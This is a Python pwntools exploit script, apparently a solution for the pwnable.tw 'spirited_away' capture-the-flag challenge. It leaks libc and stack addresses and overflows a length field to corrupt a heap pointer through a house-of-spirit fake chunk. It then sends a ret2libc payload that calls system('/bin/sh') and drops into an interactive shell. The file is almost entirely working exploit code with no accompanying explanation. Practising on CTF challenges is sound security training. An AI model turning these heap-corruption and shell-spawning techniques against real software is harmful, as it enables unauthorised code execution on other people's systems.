from pwn import *
import sys


elf = ELF('spirited_away')
if sys.argv[1] == 'r':
    p = remote('chall.pwnable.tw', 10204)
    libc = ELF('libc_32.so.6')
elif sys.argv[1] == 'l':
    p = process('./spirited_away_local', env={"LD_PRELOAD":"libc-2.23.so"})
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc.pidof(p)[0], gdbscript='''
                                        continue
                                        ''')
    libc = ELF('./libc-2.23.so')
def send_cmt(name, age, reason, comment):
    p.sendafter('name: ', name)
    p.sendafter('age: ', age)
    p.sendafter('movie? ', reason)
    p.sendafter('comment: ', comment)

def send_cmt1(name, reason, comment):
    p.sendafter('name: ', name)
    p.sendafter('movie? ', reason)
    p.sendafter('comment: ', comment)

def solve():
    # leak libc
    send_cmt('A','1\n','A'*24,'A')      # send reason 'A'*24 to leak libc 
    p.recvuntil('Reason: ')
    leak_libc = u32(p.recv()[24:28])
    libc_address = leak_libc - libc.symbols['_IO_file_sync'] - 7
    libc.address = libc_address
    system = libc.symbols['system']
    binsh = next(libc.search('/bin/sh\x00'))
    log.info("leak: %s" %hex(leak_libc))
    log.info("libc: %s" %hex(libc_address))
    log.info("system: %s" %hex(system))
    log.info("binsh: %s" %(hex(binsh)))
    p.sendline('y')

    # leak stack address
    send_cmt('A','1\n','A'*56,'A')      # send reason 'A'*24 to leak libc 
    p.recvuntil('Reason: ')
    leak_stack = u32(p.recv()[56:60])
    ebp = leak_stack - 0x20
    log.info("stack address: %s" %hex(leak_stack))
    log.info("ebp: %s" %(hex(ebp)))
    p.sendline('y')

    # overflow v1
    # the size_name will be overflowed to 0x6e
    for i in range(98):
        send_cmt('A','1\n','A','A')
        p.recv()    
        p.sendline('y')
    
    # use "comment" to overflow pointer of name
    # now pointer of name is ebp-0x48
    # free it will cause house of spirit
    # we can control ebp-0x48 with 0x6e bytes
    send_cmt1('A', 'B'*(80-0x50) + p32(0) + p32(0x40) + '\x00'*0x38 + p32(0) + p32(0x40), 'C'*80 + p32(1) + p32(ebp-0x48))
    p.sendline('y')
    
    # ret2libc
    payload = 'A'*72 + 'A'*4 + p32(system) + 'A'*4 + p32(binsh)
    send_cmt1(payload, 'A','A')
    p.sendline('n')
    p.interactive()

if __name__ == '__main__':
    solve()